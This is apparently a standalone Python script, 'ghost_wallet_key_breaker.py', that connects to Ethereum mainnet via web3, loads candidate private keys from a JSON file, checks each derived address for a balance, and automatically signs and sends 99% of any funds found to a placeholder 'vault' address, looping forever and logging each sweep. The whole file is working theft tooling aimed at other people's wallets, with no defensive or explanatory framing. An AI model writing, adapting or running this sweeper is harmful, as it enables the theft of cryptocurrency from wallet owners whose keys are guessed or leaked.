# === FILE: ghost_wallet_key_breaker.py ===
# 👻 GHOST WALLET KEY BREAKER
# Attempts wallet loads from entropy, checks balances.

import json
import time
from datetime import datetime
from web3 import Web3

CHAOS_FILE = "ghost_chaos.json"
LOGBOOK_FILE = "vault_logbook.txt"
WEB3_PROVIDER = "https://mainnet.infura.io/v3/YOUR_INFURA_KEY"

w3 = Web3(Web3.HTTPProvider(WEB3_PROVIDER))
vault_address = "0xYOUR_VAULT_ADDRESS"  # Where to send found funds

def log_action(message):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(LOGBOOK_FILE, "a") as f:
        f.write(f"[{timestamp}] {message}\n")

def load_entropy():
    try:
        with open(CHAOS_FILE, "r") as f:
            return json.load(f)
    except FileNotFoundError:
        return []

def try_keys(entropy):
    for key in entropy:
        acct = w3.eth.account.from_key(key)
        balance = w3.eth.get_balance(acct.address)
        eth_balance = w3.from_wei(balance, 'ether')
        if eth_balance > 0:
            log_action(f"[ghost_wallet_key_breaker] 🚀 FOUND BALANCE {eth_balance} ETH on {acct.address}")
            move_funds(acct, eth_balance)
        else:
            log_action(f"[ghost_wallet_key_breaker] 🥀 Tried {acct.address}, empty.")

def move_funds(account, amount):
    tx = {
        "to": vault_address,
        "value": w3.to_wei(amount * 0.99, "ether"),
        "gas": 21000,
        "gasPrice": w3.to_wei("50", "gwei"),
        "nonce": w3.eth.get_transaction_count(account.address)
    }
    signed = w3.eth.account.sign_transaction(tx, private_key=account.key)
    tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
    log_action(f"[ghost_wallet_key_breaker] 💰 Moved funds to vault: {tx_hash.hex()}")

def main():
    print("[ghost_wallet_key_breaker] 👻 Running key breaker...")
    while True:
        entropy = load_entropy()
        try_keys(entropy)
        time.sleep(20)

if __name__ == "__main__":
    main()